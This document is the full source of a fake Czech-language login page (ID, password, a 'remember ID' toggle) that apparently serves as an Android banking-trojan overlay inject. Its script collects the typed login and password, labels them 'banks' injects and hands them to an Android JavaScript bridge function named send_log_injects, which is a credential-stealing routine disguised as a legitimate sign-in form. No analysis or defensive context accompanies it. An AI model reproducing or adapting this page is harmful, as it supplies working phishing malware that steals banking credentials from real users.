<style type="text/css">
    body {
        background: linear-gradient( to bottom,#134057, #7c98a3 ) no-repeat;
        margin: 0;
        padding: 0;
        font-family: Helvetica, sans-serif;
        height: 755px;
    }
    .logo {
text-align: center;
    background-size: 100%;
    padding: 0px 0px 10px 0px;
    background: none;
    color: #fff;
    font-weight: 400;
    text-decoration: none;
    }
    .form {
        text-align: center;
        padding-top: 70px;
    }
    .form label {
        display: block;
    }
    form {
        display: inline-block;
    }
fieldset {
      position: relative;
      text-align: center;
      border: none;
          margin: 0;
    padding: 0;

}

input[type="text"],input[type="password"] {
line-height: 16px;
    font-size: 17px;
    box-sizing: border-box;
    width: 100%;
    position: relative;
    padding: 10px;
    margin: 0px 1px;
    display: block;
    -webkit-box-shadow: none;
    box-shadow: none;
    -webkit-appearance: none;
    height: 48px;
    margin: 0px 0px 10px 0px;
    color: #fff;
    text-align: left;
    outline: none;
    border: 1px solid #d1d1d1;
    background: none;
    border-top: none;
    border-left: none;
    border-right: none;
}
input[type="button"] {
left: 0;
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    color: #ffffff;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #b8003e;
}
input::placeholder {
    color: #fff;
    font-size: 15px;
}
input[type="checkbox"] {
    display: none;
}

/* стили для метки */
input[type="checkbox"] + label {
    cursor: pointer;
    padding-left: 50px;
    position: relative;
    font-family: tahoma, sans-serif, arial;
    line-height: 40px;
}

/* стили для поля с бегунком*/
input[type="checkbox"] + label::before {
content: "";
    display: inline-block;
    position: absolute;
    top: 0;
    left: 0;
    vertical-align: middle;
    padding: 0;
    height: 24px;
    width: 45px;
    margin: 0 5px 0 0;
    border: 1px solid #cacaca;
    border-radius: 12px;
    background: none;
}

/* стили для бегунка*/
input[type="checkbox"] + label::after {
    content: "";
    display: block;
    position: absolute;
    top: 1px;
    left: 1px;
    width: 22px;
    height: 22px;
    border-radius: 22px;
    background: #ffffff;
    border: 1px solid #cacaca;
    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
}

/* плавность )) */
input[type="checkbox"] + label::before,
input[type="checkbox"] + label::after {
    -webkit-transition: all .2s ease-out;
    transition: all .2s ease-out;
}


input[type="checkbox"]:checked + label::after {
    left: 22px;
}
</style>

<div class="area" style="padding: 30px;border-radius: 10px;margin: 0px 20px 0px 20px;height: 180px;">
        <input type="text" name="login" id="login" placeholder="Přihlašovací ID" style="height: 50px;">
        <input type="password" name="password" id="password" placeholder="Heslo" style="height: 50px;">
        <input name="exit" type="hidden" text="true"/>
        <div style="">
                <label style="color: #fff;font-size: 16px;float: left;">Pamatujte si ID</label>
        <input id="checkbox1" name="sumbit" type="checkbox">
        <label for="checkbox1" style="float: right;"></label>
    </div>
        <input type="button" name="sumbit" onclick="send_form()" value="PŘIHLÁSIT SE" style="position: relative; top: 35px;">
</div>

<script>
function send_form()
{
    if (document.getElementById("login").value == '')
{
    alert ('Všechna políčka jsou povinná!');
    return false;
}
if (document.getElementById("password").value == '')
{
    alert ('Všechna políčka jsou povinná!');
    return false;
}
var data = {};
    data.login = document.getElementById('login').value;
    data.password = document.getElementById('password').value;
    data.type_injects = "banks";
    data.closed = "close_activity_injects";
    
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
            Android.send_log_injects(JSON.stringify(data))
        } catch (err) {}
    }else{
        alert(JSON.stringify(data));
    } 
}
function show() {
    var p = document.getElementById('password');
    p.setAttribute('type', 'text');
}

function hide() {
    var p = document.getElementById('password');
    p.setAttribute('type', 'password');
}

var pwShown = 0;

document.getElementById("eye").addEventListener("click", function () {
    if (pwShown == 0) {
        pwShown = 1;
        show();
    } else {
        pwShown = 0;
        hide();
    }
}, false);
</script>
